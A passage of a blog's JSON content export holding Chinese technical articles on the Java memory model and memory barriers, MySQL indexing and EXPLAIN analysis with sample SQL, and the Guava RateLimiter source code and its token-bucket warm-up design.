ILP）来将多条指令重叠执行。如果不存在数据依赖性，处理器可以改变语句对应机器指令的执行顺序。 内存系统的重排序。由于处理器使用缓存和读 / 写缓冲区，这使得加载和存储操作看上去可能是在乱序执行。 从 java 源代码到最终实际执行的指令序列，会分别经历下面三种重排序： 上述的 1 属于编译器重排序，2 和 3 属于处理器重排序。这些重排序都可能会导致多线程程序出现内存可见性问题。对于编译器，JMM 的编译器重排序规则会禁止特定类型的编译器重排序（不是所有的编译器重排序都要禁止）。对于处理器重排序，JMM 的处理器重排序规则会要求 java 编译器在生成指令序列时，插入特定类型的内存屏障（memory barriers，intel 称之为 memory fence）指令，通过内存屏障指令来禁止特定类型的处理器重排序（不是所有的处理器重排序都要禁止）。 JMM 属于语言级的内存模型，它确保在不同的编译器和不同的处理器平台之上，通过禁止特定类型的编译器重排序和处理器重排序，为程序员提供一致的内存可见性保证。 处理器重排序与内存屏障指令现代的处理器使用写缓冲区来临时保存向内存写入的数据。写缓冲区可以保证指令流水线持续运行，它可以避免由于处理器停顿下来等待向内存写入数据而产生的延迟。同时，通过以批处理的方式刷新写缓冲区，以及合并写缓冲区中对同一内存地址的多次写，可以减少对内存总线的占用。虽然写缓冲区有这么多好处，但每个处理器上的写缓冲区，仅仅对它所在的处理器可见。这个特性会对内存操作的执行顺序产生重要的影响：处理器对内存的读 / 写操作的执行顺序，不一定与内存实际发生的读 / 写操作顺序一致！为了具体说明，请看下面示例： Processor A Processor B a = 1; //A1 x = b; //A2 b = 2; //B1 y = a; //B2 初始状态：a = b = 0 处理器允许执行后得到结果：x = y = 0 假设处理器 A 和处理器 B 按程序的顺序并行执行内存访问，最终却可能得到 x = y = 0 的结果。具体的原因如下图所示： 这里处理器 A 和处理器 B 可以同时把共享变量写入自己的写缓冲区（A1，B1），然后从内存中读取另一个共享变量（A2，B2），最后才把自己写缓存区中保存的脏数据刷新到内存中（A3，B3）。当以这种时序执行时，程序就可以得到 x = y = 0 的结果。 从内存操作实际发生的顺序来看，直到处理器 A 执行 A3 来刷新自己的写缓存区，写操作 A1 才算真正执行了。虽然处理器 A 执行内存操作的顺序为：A1-&gt;A2，但内存操作实际发生的顺序却是：A2-&gt;A1。此时，处理器 A 的内存操作顺序被重排序了（处理器 B 的情况和处理器 A 一样，这里就不赘述了）。 这里的关键是，由于写缓冲区仅对自己的处理器可见，它会导致处理器执行内存操作的顺序可能会与内存实际的操作执行顺序不一致。由于现代的处理器都会使用写缓冲区，因此现代的处理器都会允许对写 - 读操做重排序。 下面是常见处理器允许的重排序类型的列表： Load-Load Load-Store Store-Store Store-Load 数据依赖 sparc-TSO N N N Y N x86 N N N Y N ia64 Y Y Y Y N PowerPC Y Y Y Y N 上表单元格中的“N”表示处理器不允许两个操作重排序，“Y”表示允许重排序。 从上表我们可以看出：常见的处理器都允许 Store-Load 重排序；常见的处理器都不允许对存在数据依赖的操作做重排序。sparc-TSO 和 x86 拥有相对较强的处理器内存模型，它们仅允许对写 - 读操作做重排序（因为它们都使用了写缓冲区）。 ※注 1：sparc-TSO 是指以 TSO(Total Store Order) 内存模型运行时，sparc 处理器的特性。 ※注 2：上表中的 x86 包括 x64 及 AMD64。 ※注 3：由于 ARM 处理器的内存模型与 PowerPC 处理器的内存模型非常类似，本文将忽略它。 ※注 4：数据依赖性后文会专门说明。 为了保证内存可见性，java 编译器在生成指令序列的适当位置会插入内存屏障指令来禁止特定类型的处理器重排序。JMM 把内存屏障指令分为下列四类： 屏障类型 指令示例 说明 LoadLoad Barriers Load1; LoadLoad; Load2 确保 Load1 数据的装载，之前于 Load2 及所有后续装载指令的装载。 StoreStore Barriers Store1; StoreStore; Store2 确保 Store1 数据对其他处理器可见（刷新到内存），之前于 Store2 及所有后续存储指令的存储。 LoadStore Barriers Load1; LoadStore; Store2 确保 Load1 数据装载，之前于 Store2 及所有后续的存储指令刷新到内存。 StoreLoad Barriers Store1; StoreLoad; Load2 确保 Store1 数据对其他处理器变得可见（指刷新到内存），之前于 Load2 及所有后续装载指令的装载。StoreLoad Barriers 会使该屏障之前的所有内存访问指令（存储和装载指令）完成之后，才执行该屏障之后的内存访问指令。 StoreLoad Barriers 是一个“全能型”的屏障，它同时具有其他三个屏障的效果。现代的多处理器大都支持该屏障（其他类型的屏障不一定被所有处理器支持）。执行该屏障开销会很昂贵，因为当前处理器通常要把写缓冲区中的数据全部刷新到内存中（buffer fully flush）。 happens-before从 JDK5 开始，java 使用新的 JSR -133 内存模型（本文除非特别说明，针对的都是 JSR- 133 内存模型）。JSR-133 提出了 happens-before 的概念，通过这个概念来阐述操作之间的内存可见性。如果一个操作执行的结果需要对另一个操作可见，那么这两个操作之间必须存在 happens-before 关系。这里提到的两个操作既可以是在一个线程之内，也可以是在不同线程之间。 与程序员密切相关的 happens-before 规则如下： 程序顺序规则：一个线程中的每个操作，happens- before 于该线程中的任意后续操作。 监视器锁规则：对一个监视器锁的解锁，happens- before 于随后对这个监视器锁的加锁。 volatile 变量规则：对一个 volatile 域的写，happens- before 于任意后续对这个 volatile 域的读。 传递性：如果 A happens- before B，且 B happens- before C，那么 A happens- before C。 注意，两个操作之间具有 happens-before 关系，并不意味着前一个操作必须要在后一个操作之前执行！happens-before 仅仅要求前一个操作（执行的结果）对后一个操作可见，且前一个操作按顺序排在第二个操作之前（the first is visible to and ordered before the second）。happens- before 的定义很微妙，后文会具体说明 happens-before 为什么要这么定义。 happens-before 与 JMM 的关系如下图所示： 如上图所示，一个 happens-before 规则通常对应于多个编译器重排序规则和处理器重排序规则。对于 java 程序员来说，happens-before 规则简单易懂，它避免程序员为了理解 JMM 提供的内存可见性保证而去学习复杂的重排序规则以及这些规则的具体实现。 参考文献 Programming Language Pragmatics, Third Edition The Java Language Specification, Third Edition JSR-133: Java Memory Model and Thread Specification Java theory and practice: Fixing the Java Memory Model, Part 2 Understanding POWER Multiprocessors Concurrent Programming on Windows The Art of Multiprocessor Programming Intel® 64 and IA-32 ArchitecturesvSoftware Developer’s Manual Volume 3A: System Programming Guide, Part 1 Java Concurrency in Practice The JSR-133 Cookbook for Compiler Writers 关于作者程晓明，Java 软件工程师，国家认证的系统分析师、信息项目管理师。专注于并发编程，就职于富士通南大。个人邮箱：asst2003@163.com。","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"内存模型","slug":"内存模型","permalink":"https://gschaos.club/tags/%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/"}]},{"title":"MySQL的索引","slug":"索引","date":"2019-11-08T16:00:00.000Z","updated":"2020-10-25T08:29:41.000Z","comments":true,"path":"索引/","link":"","permalink":"https://gschaos.club/%E7%B4%A2%E5%BC%95/","excerpt":"索引类似大学图书馆建书目索引，可以提高数据检索的效率，降低数据库的IO成本。MySQL在300万条记录左右性能开始逐渐下降，虽然官方文档说500~800w记录，所以大数据量建立索引是非常有必要的。MySQL提供了Explain，用于显示SQL执行的详细信息，可以进行索引的优化,转自：http://cmsblogs.com/?p=2818","text":"索引类似大学图书馆建书目索引，可以提高数据检索的效率，降低数据库的IO成本。MySQL在300万条记录左右性能开始逐渐下降，虽然官方文档说500~800w记录，所以大数据量建立索引是非常有必要的。MySQL提供了Explain，用于显示SQL执行的详细信息，可以进行索引的优化,转自：http://cmsblogs.com/?p=2818 MySQL的索引是什么？怎么优化一、导致SQL执行慢的原因： 硬件问题。如网络速度慢，内存不足，I/O吞吐量小，磁盘空间满了等。 没有索引或者索引失效。（一般在互联网公司，DBA会在半夜把表锁了，重新建立一遍索引，因为当你删除某个数据的时候，索引的树结构就不完整了。所以互联网公司的数据做的是假删除.一是为了做数据分析,二是为了不破坏索引 ） 数据过多（分库分表） 服务器调优及各个参数设置（调整my.cnf） 二、分析原因时，一定要找切入点： 先观察，开启慢查询日志，设置相应的阈值（比如超过3秒就是慢SQL），在生产环境跑上个一天过后，看看哪些SQL比较慢。 Explain和慢SQL分析。比如SQL语句写的烂，索引没有或失效，关联查询太多（有时候是设计缺陷或者不得以的需求）等等。 Show Profile是比Explain更近一步的执行细节，可以查询到执行每一个SQL都干了什么事，这些事分别花了多少秒。 找DBA或者运维对MySQL进行服务器的参数调优。 三、什么是索引？MySQL官方对索引的定义为：索引(Index)是帮助MySQL高效获取数据的数据结构。我们可以简单理解为：快速查找排好序的一种数据结构。Mysql索引主要有两种结构：B+Tree索引和Hash索引。我们平常所说的索引，如果没有特别指明，一般都是指B树结构组织的索引(B+Tree索引)。索引如图所示： 最外层浅蓝色磁盘块1里有数据17、35（深蓝色）和指针P1、P2、P3（黄色）。P1指针表示小于17的磁盘块，P2是在17-35之间，P3指向大于35的磁盘块。真实数据存在于子叶节点也就是最底下的一层3、5、9、10、13……非叶子节点不存储真实的数据，只存储指引搜索方向的数据项，如17、35。 查找过程：例如搜索28数据项，首先加载磁盘块1到内存中，发生一次I/O，用二分查找确定在P2指针。接着发现28在26和30之间，通过P2指针的地址加载磁盘块3到内存，发生第二次I/O。用同样的方式找到磁盘块8，发生第三次I/O。 真实的情况是，上面3层的B+Tree可以表示上百万的数据，上百万的数据只发生了三次I/O而不是上百万次I/O，时间提升是巨大的。 四、Explain分析 前文铺垫完成，进入实操部分，先来插入测试需要的数据： 12345678910111213141516171819202122232425262728293031323334353637CREATE TABLE `user_info` ( `id` BIGINT(20) NOT NULL AUTO_INCREMENT, `name` VARCHAR(50) NOT NULL DEFAULT &#x27;&#x27;, `age` INT(11) DEFAULT NULL, PRIMARY KEY (`id`), KEY `name_index` (`name`))ENGINE = InnoDB DEFAULT CHARSET = utf8;INSERT INTO user_info (name, age) VALUES (&#x27;xys&#x27;, 20);INSERT INTO user_info (name, age) VALUES (&#x27;a&#x27;, 21);INSERT INTO user_info (name, age) VALUES (&#x27;b&#x27;, 23);INSERT INTO user_info (name, age) VALUES (&#x27;c&#x27;, 50);INSERT INTO user_info (name, age) VALUES (&#x27;d&#x27;, 15);INSERT INTO user_info (name, age) VALUES (&#x27;e&#x27;, 20);INSERT INTO user_info (name, age) VALUES (&#x27;f&#x27;, 21);INSERT INTO user_info (name, age) VALUES (&#x27;g&#x27;, 23);INSERT INTO user_info (name, age) VALUES (&#x27;h&#x27;, 50);INSERT INTO user_info (name, age) VALUES (&#x27;i&#x27;, 15);CREATE TABLE `order_info` ( `id` BIGINT(20) NOT NULL AUTO_INCREMENT, `user_id` BIGINT(20) DEFAULT NULL, `product_name` VARCHAR(50) NOT NULL DEFAULT &#x27;&#x27;, `productor` VARCHAR(30) DEFAULT NULL, PRIMARY KEY (`id`), KEY `user_product_detail_index` (`user_id`, `product_name`, `productor`))ENGINE = InnoDB DEFAULT CHARSET = utf8;INSERT INTO order_info (user_id, product_name, productor) VALUES (1, &#x27;p1&#x27;, &#x27;WHH&#x27;);INSERT INTO order_info (user_id, product_name, productor) VALUES (1, &#x27;p2&#x27;, &#x27;WL&#x27;);INSERT INTO order_info (user_id, product_name, productor) VALUES (1, &#x27;p1&#x27;, &#x27;DX&#x27;);INSERT INTO order_info (user_id, product_name, productor) VALUES (2, &#x27;p1&#x27;, &#x27;WHH&#x27;);INSERT INTO order_info (user_id, product_name, productor) VALUES (2, &#x27;p5&#x27;, &#x27;WL&#x27;);INSERT INTO order_info (user_id, product_name, productor) VALUES (3, &#x27;p3&#x27;, &#x27;MA&#x27;);INSERT INTO order_info (user_id, product_name, productor) VALUES (4, &#x27;p1&#x27;, &#x27;WHH&#x27;);INSERT INTO order_info (user_id, product_name, productor) VALUES (6, &#x27;p1&#x27;, &#x27;WHH&#x27;);INSERT INTO order_info (user_id, product_name, productor) VALUES (9, &#x27;p8&#x27;, &#x27;TE&#x27;); 初体验，执行Explain的效果：索引使用情况在possible_keys、key和key_len三列，接下来我们先从左到右依次讲解。 1.id12--id相同,执行顺序由上而下explain select u.*,o.* from user_info u,order_info o where u.id=o.user_id; 12--id不同,值越大越先被执行explain select * from user_info where id=(select user_id from order_info where product_name =&#x27;p8&#x27;); 2.select_type可以看id的执行实例，总共有以下几种类型： SIMPLE： 表示此查询不包含 UNION 查询或子查询 PRIMARY： 表示此查询是最外层的查询 SUBQUERY： 子查询中的第一个 SELECT UNION： 表示此查询是 UNION 的第二或随后的查询 DEPENDENT UNION： UNION 中的第二个或后面的查询语句, 取决于外面的查询 UNION RESULT, UNION 的结果 DEPENDENT SUBQUERY: 子查询中的第一个 SELECT, 取决于外面的查询. 即子查询依赖于外层查询的结果. DERIVED：衍生，表示导出表的SELECT（FROM子句的子查询） 3.tabletable表示查询涉及的表或衍生的表： 1explain select tt.* from (select u.* from user_info u,order_info o where u.id=o.user_id and u.id=1) tt id为1的的表示id为2的u和o表衍生出来的。 4.typetype 字段比较重要，它提供了判断查询是否高效的重要依据依据。 通过 type 字段，我们判断此次查询是 全表扫描 还是 索引扫描等。 type 常用的取值有: system: 表中只有一条数据， 这个类型是特殊的 const 类型。 const: 针对主键或唯一索引的等值查询扫描，最多只返回一行数据。 const 查询速度非常快， 因为它仅仅读取一次即可。例如下面的这个查询，它使用了主键索引，因此 type 就是 const 类型的：explain select * from user_info where id = 2； eq_ref: 此类型通常出现在多表的 join 查询，表示对于前表的每一个结果，都只能匹配到后表的一行结果。并且查询的比较操作通常是 =，查询效率较高。例如：explain select * from user_info, order_info where user_info.id = order_info.user_id; ref: 此类型通常出现在多表的 join 查询，针对于非唯一或非主键索引，或者是使用了 最左前缀 规则索引的查询。例如下面这个例子中， 就使用到了 ref 类型的查询：explain select * from user_info, order_info where user_info.id = order_info.user_id AND order_info.user_id = 5 range: 表示使用索引范围查询，通过索引字段范围获取表中部分数据记录。这个类型通常出现在 =, &lt;&gt;, &gt;, &gt;=, &lt;, &lt;=, IS NULL, &lt;=&gt;, BETWEEN, IN() 操作中。例如下面的例子就是一个范围查询：explain select * from user_info where id between 2 and 8； index: 表示全索引扫描(full index scan)，和 ALL 类型类似，只不过 ALL 类型是全表扫描，而 index 类型则仅仅扫描所有的索引， 而不扫描数据。index 类型通常出现在：所要查询的数据直接在索引树中就可以获取到, 而不需要扫描数据。当是这种情况时，Extra 字段 会显示 Using index。 ALL: 表示全表扫描，这个类型的查询是性能最差的查询之一。通常来说， 我们的查询不应该出现 ALL 类型的查询，因为这样的查询在数据量大的情况下，对数据库的性能是巨大的灾难。 如一个查询是 ALL 类型查询， 那么一般来说可以对相应的字段添加索引来避免。 通常来说, 不同的 type 类型的性能关系如下：ALL &lt; index &lt; range ~ index_merge &lt; ref &lt; eq_ref &lt; const &lt; system ALL 类型因为是全表扫描， 因此在相同的查询条件下，它是速度最慢的。而 index 类型的查询虽然不是全表扫描，但是它扫描了所有的索引，因此比 ALL 类型的稍快.后面的几种类型都是利用了索引来查询数据，因此可以过滤部分或大部分数据，因此查询效率就比较高了。 5.possible_keys它表示 mysql 在查询时，可能使用到的索引。 注意，即使有些索引在 possible_keys 中出现，但是并不表示此索引会真正地被 mysql 使用到。 mysql 在查询时具体使用了哪些索引，由 key 字段决定。 6.key此字段是 mysql 在当前查询时所真正使用到的索引。比如请客吃饭,possible_keys是应到多少人，key是实到多少人。当我们没有建立索引时： 123explain select o.* from order_info o where o.product_name= &#x27;p1&#x27; and o.productor=&#x27;whh&#x27;;create index idx_name_productor on order_info(productor);drop index idx_name_productor on order_info; 建立复合索引后再查询： 7.key_len表示查询优化器使用了索引的字节数，这个字段可以评估组合索引是否完全被使用。 8.ref这个表示显示索引的哪一列被使用了，如果可能的话,是一个常量。前文的type属性里也有ref，注意区别。 9.rowsrows 也是一个重要的字段，mysql 查询优化器根据统计信息，估算 sql 要查找到结果集需要扫描读取的数据行数，这个值非常直观的显示 sql 效率好坏， 原则上 rows 越少越好。可以对比key中的例子，一个没建立索引钱，rows是9，建立索引后，rows是4。 10.extra explain 中的很多额外的信息会在 extra 字段显示, 常见的有以下几种内容: using filesort ：表示 mysql 需额外的排序操作，不能通过索引顺序达到排序效果。一般有 using filesort都建议优化去掉，因为这样的查询 cpu 资源消耗大。 using index：覆盖索引扫描，表示查询在索引树中就可查找所需数据，不用扫描表数据文件，往往说明性能不错。 using temporary：查询有使用临时表, 一般出现于排序， 分组和多表 join 的情况， 查询效率不高，建议优化。 using where ：表名使用了where过滤。 五、优化案例1sqlexplain select u.*,o.* from user_info u LEFT JOIN order_info o on u.id=o.user_id; 执行结果，type有ALL，并且没有索引： 开始优化，在关联列上创建索引，明显看到type列的ALL变成ref，并且用到了索引，rows也从扫描9行变成了1行： 这里面一般有个规律是：左链接索引加在右表上面，右链接索引加在左表上面。 六、是否需要创建索引？索引虽然能非常高效的提高查询速度，同时却会降低更新表的速度。实际上索引也是一张表，该表保存了主键与索引字段，并指向实体表的记录，所以索引列也是要占用空间的。","categories":[{"name":"数据库","slug":"数据库","permalink":"https://gschaos.club/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://gschaos.club/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"Mysql","slug":"Mysql","permalink":"https://gschaos.club/tags/Mysql/"}]},{"title":"限流原理解读之guava中的RateLimiter","slug":"The RateLimiter in the guava","date":"2019-10-18T16:00:00.000Z","updated":"2020-10-25T08:28:00.000Z","comments":true,"path":"The RateLimiter in the guava/","link":"","permalink":"https://gschaos.club/The%20RateLimiter%20in%20the%20guava/","excerpt":"限流原理解读之guava中的RateLimiter","text":"限流原理解读之guava中的RateLimiter 限流原理解读之guava中的RateLimiterRateLimiter有两种新建的方式 创建Bursty方式 创建WarmingUp方式 以下源码来自 guava-17.0 Bursty1234567//初始化RateLimiter r = RateLimiter.create(1); //不阻塞r.tryAcquire();//阻塞r.acquire() RateLimiter.create做了两件事情创建Bursty对象和设置了速率,至次初始化过程结束 123RateLimiter rateLimiter = new Bursty(ticker, 1.0 /* maxBurstSeconds */); //ticker默认使用自己定义的rateLimiter.setRate(permitsPerSecond); 新建Bursty对象。它指定的是能够存储的最大时间是多长，比如设置的时间是1s,那么假设允许每秒钟发放的令牌数量为2，能存储的最大量为2； setRate。 内部通过私有锁来保证速率的修改是线程安全的 12345678910synchronized (mutex) &#123; //1：查看当前的时间是否比预计下次可发放令牌的时间要大，如果大，更新下次可发放令牌的时间为当前时间 resync(readSafeMicros()); //2：计算两次发放令牌之间的时间间隔，比如1s中需要发放5个，那它就是 200000.0微秒 double stableIntervalMicros = TimeUnit.SECONDS.toMicros(1L) / permitsPerSecond; this.stableIntervalMicros = stableIntervalMicros; //3：设置maxPermits和storedPermits doSetRate(permitsPerSecond, stableIntervalMicros);&#125; resync源码 123456789private void resync(long nowMicros) &#123; // 查看当前的时间是否比预计下次可发放令牌的时间要大，如果大，更新下次可发放令牌的时间为当前时间 if (nowMicros &gt; nextFreeTicketMicros) &#123; storedPermits = Math.min(maxPermits, storedPermits + (nowMicros - nextFreeTicketMicros) / stableIntervalMicros); nextFreeTicketMicros = nowMicros; &#125;&#125; doSetRate源码 12345678@Overridevoid doSetRate(double permitsPerSecond, double stableIntervalMicros) &#123; double oldMaxPermits = this.maxPermits; maxPermits = maxBurstSeconds * permitsPerSecond; storedPermits = (oldMaxPermits == 0.0) ? 0.0 // 初始条件存储的是没有 storedPermits * maxPermits / oldMaxPermits;&#125; 在整个的初始化过程中，关键信息是： nextFreeTicketMicros 预计下次发放令牌的时间, stableIntervalMicros 两次发放令牌之间的时间间隔 maxPermits 最大能存储的令牌的数量 storedPermits 已经存储的令牌数 为什么是nextFreeTicketMicros?最简单的维持QPS速率的方式就是记住最后一次请求的时间，然后确保再次有请求过来的时候，已经经过了 1/QPS 秒。比如QPS是5 次/秒，只需要确保两次请求时间经过了200ms即可，如果刚好在100ms到达，就会再等待100ms,也就是说，如果一次性需要15个令牌，需要的时间为为3s。但是对于一个长时间没有请求的系统，这样的的设计方式有一定的不合理之处。考虑一个场景：如果一个RateLimiter,每秒产生1个令牌,它一直没有使用过，突然来了一个需要100个令牌的请求，选择等待100s再执行这个请求，显得不太明智，更好的处理方式为立即执行它，然后把接下来的请求推迟100s。 因而RateLimiter本身并不记下最后一次请求的时间，而是记下下一次期望运行的时间（nextFreeTicketMicros）。 这种方式带来的一个好处是，可以去判断等待的超时时间是否大于下次运行的时间，以使得能够执行，如果等待的超时时间太短，就能立即返回。 为什么会有一个标记代表存储了多少令牌？同样的考虑长时间没有使用的场景。如果长时间没有请求，突然间来了，这个时候是否应该立马放行这些请求？长时间没有使用可能意味着两件事： 很多资源是存在空闲的情况，比如说网络请求长时间没有，它的缓冲区很有可能是空的，此时是可以加速传输，提高它的利用率 一些时候，瞬间的爆发会导致溢出，比如说服务上的缓存过期了，需要去查询库，这个花销是非常“昂贵”的，过多的请求会导致数据库撑不住 RateLimiter就使用storedPermits来给过去请求的不充分程度建模。它的存储规则如下： 假设RateLimiter每秒产生一个令牌,每过去一秒如果没有请求，RateLimter也就没有消费，就使storedPermits增长1。假设10s之内都没有请求过来,storedPermits就变成了10（假设maxPermits&gt;10），此时如果要获取3个令牌，会使用storedPermits来中的令牌来处理，然后它的值变为了7，片刻之后，如果调用了acquire(10),部分的会从storedPermits拿到7个权限，剩余的3个则需要重新产生。 总的来说RateLimiter提供了一个storedPermits变量，当资源利用充分的时候，它就是0，最大可以增长到 maxStoredPermits。请求所需的令牌来自于两个地方：stored permits(空闲时存储的令牌)和fresh permits（现有的令牌） 怎么衡量从storedPermits中获取令牌这个过程？同样假设每秒RateLimiter只生产一个令牌，正常情况下，如果一次来了3个请求，整个过程会持续3秒钟。考虑到长时间没有请求的场景： 资源空闲。这种时候系统是能承受住一定量的请求的，当然希望在承受范围之内能够更快的提供请求，也就是说，如果有存储令牌，相比新产生令牌，此时希望能够更快的获取令牌，也就是此时从存储令牌中获取令牌的时间消耗要比产生新令牌要少，从而更快相应请求 瞬时流量过大。这时候就不希望过快的消耗存储的令牌，希望它能够相比产生新的令牌的时间消耗大些，从而能够使请求相对平缓。 分析可知，针对不同的场景，需要对获取storedPermits做不同的处理，Ratelimiter的实现方式就是 storedPermitsToWaitTime 函数，它建立了从storedPermits中获取令牌和时间花销的模型函数,而衡量时间的花销就是通过对模型函数进行积分计算，比如原来存储了10个令牌，现在需要拿3个令牌，还剩余7个，那么所需要的时间花销就是该函数从7-10区间中的积分。 这种方式保证了任何获取令牌方式所需要的时间都是一样的，好比 每次拿一个和先拿两个再拿一个，从时间上来讲并没有分别。 storedPermitsToWaitTime实现原理storedPermits本身是用来衡量没有使用的时间的。在没有使用令牌的时候存储，存储的速率（单位时间内存储的令牌的个数）是 每没用1次就存储1次: rate=permites/time 。也就是说 1 / rate = time / permits，那么可得到 (1/rate)*permits 就可以来衡量时间花销。 选取(1/rate)作为基准线 如果选取一条在它之上的线，就做到了比从fresh permits中获取要慢； 如果在基准线之下，则是比从fresh permits中获取要快； 刚好是基准线，那么从storedPermits中获取和新产生的速率一模一样； Bursty的storedPermitsToWaitTime函数实现1234long storedPermitsToWaitTime(double storedPermits, double permitsToTake) &#123; return 0L;&#125; 它直接返回了0，也就是在基准线之下，获取storedPermits的速率比新产生要快，立即能够拿到存储的量 WarmingUp1234567//初始化RateLimiter r =RateLimiter.create(1,1,TimeUnit.SECONDS);//不阻塞r.tryAcquire();//阻塞r.acquire() create方法创建了WarmingUp对象，并这只了对应的速率 123RateLimiter rateLimiter = new WarmingUp(ticker, warmupPeriod, unit);rateLimiter.setRate(permitsPerSecond);复制代码 相比Bursty，它多了个参数warmupPeroid,它会以提供的unit为时间单位，转换成微秒存储。setRate类似于Bursty，只是在doSetRate提供不同的实现 12345678910111213141516171819void doSetRate(double permitsPerSecond, double stableIntervalMicros) &#123; double oldMaxPermits = maxPermits; //1:最大的存储个数为需要预热的时间除以两个请求的时间间隔，比如设定预热时间为1s,每秒有5个请求，那么最大的存储个数为1000ms/200ms=5个 maxPermits = warmupPeriodMicros / stableIntervalMicros; //2:计算最大存储permits的一半 halfPermits = maxPermits / 2.0; //3:初始化稳定时间间隔的3倍作为冷却时间间隔 double coldIntervalMicros = stableIntervalMicros * 3.0; //4:设置基准线的斜率 slope = (coldIntervalMicros - stableIntervalMicros) / halfPermits; if (oldMaxPermits == Double.POSITIVE_INFINITY) &#123; storedPermits = 0.0; &#125; else &#123; storedPermits = (oldMaxPermits == 0.0) ? maxPermits // 初始条件下，认为就是存储满的，以达到缓慢消费的效果 : storedPermits * maxPermits / oldMaxPermits; &#125;&#125; 在这个过程中可以看到Warmup方式新增了一个halfPermits的设计，以及通过公式 slope=(coldIntervalMicros-stableIntervalMicros)/halfPermits，他们在函数 storedPermitsToWaitTime中得到了运用 1234567891011121314151617181920@Overridelong storedPermitsToWaitTime(double storedPermits, double permitsToTake) &#123; //1:计算储存的令牌中超过了最大令牌一半的数量 double availablePermitsAboveHalf = storedPermits - halfPermits; long micros = 0; // 计算超过一半的部分所需要的时间花销(对于函数来说，就是积分计算) if (availablePermitsAboveHalf &gt; 0.0) &#123; double permitsAboveHalfToTake = Math.min(availablePermitsAboveHalf, permitsToTake); micros = (long) (permitsAboveHalfToTake * (permitsToTime(availablePermitsAboveHalf) + permitsToTime(availablePermitsAboveHalf - permitsAboveHalfToTake)) / 2.0); permitsToTake -= permitsAboveHalfToTake; &#125; // 计算函数的尚未超过一半的部分所需要的时间花销 micros += (stableIntervalMicros * permitsToTake); return micros;&#125;private double permitsToTime(double permits) &#123; return stableIntervalMicros + permits * slope;&#125; WarmingUp的设计理念WarmingUp对时间花销衡量方式为下图 1234567891011121314151617* ^ throttling* |* 3*stable + /* interval | /.* (cold) | / .* | / . &lt;-- &quot;warmup period&quot; is the area of the trapezoid between* 2*stable + / . halfPermits and maxPermits* interval | / .* | / .* | / .* stable +----------/ WARM . &#125;* interval | . UP . &#125; &lt;-- this rectangle (from 0 to maxPermits, and* | . PERIOD. &#125; height == stableInterval) defines the cooldown period,* | . . &#125; and we want cooldownPeriod == warmupPeriod* |---------------------------------&gt; storedPermits* (halfPermits) (maxPermits) 横轴表示存储的令牌个数，纵轴表示时间，这样函数的积分就可以表示所要消耗的时间。在程序刚开始运行的时候，warmingup方式会存满所有的令牌，而根据从存储令牌中的获取方式，可以实现从存储最大令牌中到降到一半令牌所需要的时间为存储同量令牌时间的2倍，从而使得刚开始的时候发放令牌的速度比较慢，等消耗一半之后，获取的速率和生产的速率一致，从而也就实现了一个‘热身’的概念 从storedPermits中获取令牌所需要的时间，它分为两部分，以maxPetmits的一半为分割点 storedPermits &lt;= halfPermits 的时候,存储和消费storedPermits的速率与产生的速率一模一样 storedPermits&gt;halfPermits, 存储storePermites所需要的时间和产生的速率保持一致，但是消费storePermites从maxPermits到halfPermits所需要的时间为从halfPermits增长到maxPermits所需要时间的2被，也就是比新令牌产生要慢 为什么在分隔点计算还有斜率方面选了3倍和一半的位置 对函数做积分计算(图形面积)，刚好可以保证，超过一半的部分，如果要拿掉一半的存储令牌所需要的时间恰好是存储同样量（或者说是新令牌产生）时间花销的两倍，对应场景如果过了很长一段时间没有使用(存储的令牌会达到maxPermits),刚开始能接收请求的速率相对比较慢，然后再增长到稳定的消费速率 关键在于存储的速率是和新令牌产生的速率一样，但是消费的速率，当存储的超过一半时，会慢于新令牌产生的速率，小于一半则速率是一样的 TryAcquire它会尝试去获取令牌，如果无法获取就立即返回，否则再超时时间之内返回给定的令牌。 源码如下 1234567891011121314151617181920public boolean tryAcquire(int permits, long timeout, TimeUnit unit) &#123; //1：使用微秒来转换超时时间 long timeoutMicros = unit.toMicros(timeout); checkPermits(permits); long microsToWait; synchronized (mutex) &#123; long nowMicros = readSafeMicros(); //2.1：如果下次能够获取令牌的时间超过超时时间范围，立马返回； if (nextFreeTicketMicros &gt; nowMicros + timeoutMicros) &#123; return false; &#125; else &#123; //2.2：获取需要等待的时间，本次获取的时间肯定不会超时 microsToWait = reserveNextTicket(permits, nowMicros); &#125; &#125; //3：实行等待 ticker.sleepMicrosUninterruptibly(microsToWait); return true;&#125; 第一次运行的时候，nextFreeTicketMicros是创建时候的时间，必定小于当前时间，所以第一次肯定会放过，允许执行，只是需要计算要等待的时间。 1234567891011121314151617181920private long reserveNextTicket(double requiredPermits, long nowMicros) &#123; //1：如果下次可以获取令牌的时间在过去，更新 resync(nowMicros); //2：计算距离下次获取令牌需要的时间，如果nextFreeTikcetMicros&gt;nowMicros，这个时间段必定在超时时间之内,假如入超时时间是0，那么必定是microsToNextFreeTicket趋近于0，也就是立马能够放行； long microsToNextFreeTicket = Math.max(0, nextFreeTicketMicros - nowMicros); //3：计算需要消耗的存储的令牌 double storedPermitsToSpend = Math.min(requiredPermits, this.storedPermits); //4：计算需要新产生的令牌 double freshPermits = requiredPermits - storedPermitsToSpend; //5：计算消耗存储令牌所需要的时间和新产生令牌所需要的时间。对于Bursty来讲，消耗存储的令牌所需要时间为0，WarmingUp方式则是需要根据不同的场景有不同的结果 long waitMicros = storedPermitsToWaitTime(this.storedPermits, storedPermitsToSpend) + (long) (freshPermits * stableIntervalMicros); //6：下次能够获取令牌的时间，需要延迟当前已经等待的时间，也就是说，如果立马有请求过来会放行，但是这个等待时间将会影响后续的请求访问，也就是说，这次的请求如果当前的特别的多，下一次能够请求的能够允许的时间必定会有很长的延迟 this.nextFreeTicketMicros = nextFreeTicketMicros + waitMicros; //7：扣除消耗的存储令牌 this.storedPermits -= storedPermitsToSpend; //8：返回本次要获取令牌所需要的时间,它肯定不会超过超时时间 return microsToNextFreeTicket;&#125; Acquire它会阻塞知道允许放行，返回值为阻塞的时长 源码如下 123456public double acquire(int permits) &#123; long microsToWait = reserve(permits); //也就是调用reserveNextTicket ticker.sleepMicrosUninterruptibly(microsToWait); //阻塞住需要等待的时长 return 1.0 * microsToWait / TimeUnit.SECONDS.toMicros(1L);&#125; TryAcquire 